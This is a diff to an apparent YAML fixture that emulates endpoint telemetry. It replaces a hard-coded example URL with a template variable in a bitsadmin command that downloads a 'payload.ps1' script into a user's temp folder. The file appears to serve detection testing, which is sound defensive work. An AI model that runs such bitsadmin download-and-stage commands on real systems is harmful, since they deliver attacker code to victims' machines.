@@ -40,7 +40,7 @@ state:
   command_line:        "bitsadmin.exe  /transfer /Download /priority Foreground ${ref.payload_url} ${ref.temp_dir}\\payload.ps1"
   current_directory:   "C:\\Users\\${ref.username}\\AppData\\Local\\Temp\\"
   parent_image:        "C:\\Windows\\System32\\cmd.exe"
-  parent_command_line: '"C:\Windows\system32\cmd.exe" /c "bitsadmin.exe /transfer /Download /priority Foreground https://downloads.example.net/pkg/payload.ps1 %temp%\payload.ps1"'
+  parent_command_line: '"C:\Windows\system32\cmd.exe" /c "bitsadmin.exe /transfer /Download /priority Foreground ${ref.payload_url} %temp%\payload.ps1"'
 
 steps:
   - emit:
